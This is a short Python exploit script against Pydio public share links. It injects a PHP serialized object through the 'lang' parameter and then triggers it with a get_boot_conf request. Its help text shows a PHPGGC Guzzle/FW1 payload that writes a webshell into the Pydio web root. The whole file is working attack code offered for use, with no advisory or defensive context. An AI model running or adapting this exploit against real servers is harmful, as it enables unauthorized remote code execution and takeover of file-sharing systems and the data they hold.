import urllib
import requests
import argparse

PYDIO_SERIAL_MARKER="$phpserial$"


parser = argparse.ArgumentParser()
parser.add_argument("public_share_url", help="The full URL to Pydio public share. Ex: http://192.168.56.106/pydio/public/")
parser.add_argument("shareid", help="The ID of the public link.Ex: az7687")
parser.add_argument("payload", help="Urlencoded serialized PHP object. This can be generated with PHPGGC. Ex: ./phpggc Guzzle/FW1 /var/www/html/pydio-core-8.2.1/webshell.php webshell.php -u")
args = parser.parse_args()

# Upload the payload via setPref
r = requests.get(args.public_share_url + args.shareid + "?lang="  + PYDIO_SERIAL_MARKER + args.payload)
cookies = r.cookies

# Execute the payload via getPref
r = requests.post(args.public_share_url + "?get_action=get_boot_conf&minisite_session=" + args.shareid, cookies=cookies)

